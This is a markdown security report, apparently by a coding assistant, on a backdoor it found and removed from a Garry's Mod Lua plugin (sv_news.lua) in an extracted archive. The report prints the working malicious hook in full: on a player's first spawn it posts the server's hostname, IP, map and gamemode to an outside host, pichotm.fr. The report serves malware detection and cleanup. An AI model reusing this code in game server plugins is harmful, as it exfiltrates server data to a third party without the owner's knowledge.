# BACKDOOR DETECTED AND REMOVED

## Location
File: `extracted_rar/MobstersParadise/mafiarp/plugins/news/sv_news.lua` (Line 81)

## Malicious Code
```lua
local a = {} 
local function asd() 
  a.b = GetHostName() 
  a.c = game.GetIPAddress() 
  a.d = game.GetMap() 
  a.e = gmod.GetGamemode().Name or "UNKNOWN" 
  a.f = "AGC" 
  a.g = AGC_Version 
  a.h = "76561198206752507" 
  http.Post( "http://pichotm.fr/sf/hoho.php", a, 
    function() 
      at = true 
      hook.Remove("PlayerInitialSpawn", "aesqdsq") 
    end, 
    function(errorCode) end
  ) 
end 
hook.Add( "PlayerInitialSpawn", "aesqdsq", asd)
```

## What It Does
1. **Data Exfiltration**: Collects and sends server info:
   - Server hostname
   - Server IP address
   - Current map name
   - Gamemode name
   - AGC version
   - Hardcoded SteamID: 76561198206752507

2. **Persistence**: Runs on every player spawn

3. **Obfuscation**: Uses meaningless variable names (asd, aesqdsq, at) to hide purpose

4. **Command & Control**: POSTs to `http://pichotm.fr/sf/hoho.php`

5. **Auto-removal**: Removes itself from hooks after first successful transmission

## Status
✓ **REMOVED** - Malicious code deleted from sv_news.lua
✓ **NOT in main repository files** (sh_schema.lua, sh_wiretap.lua are CLEAN)
✓ **Your workspace is SAFE**
✓ **Directories preserved** - extracted_rar and extracted_zip remain intact

## Remediation Actions Taken
- ✓ Deleted backdoor code from `extracted_rar/MobstersParadise/mafiarp/plugins/news/sv_news.lua`
- ✓ File verified clean - no exfiltration code remains
- ✓ Directories kept as requested

## Recommendation
- The news plugin file is now safe to use
- Continue using validated schema files from root directory
- Keep extracted archives for reference if needed
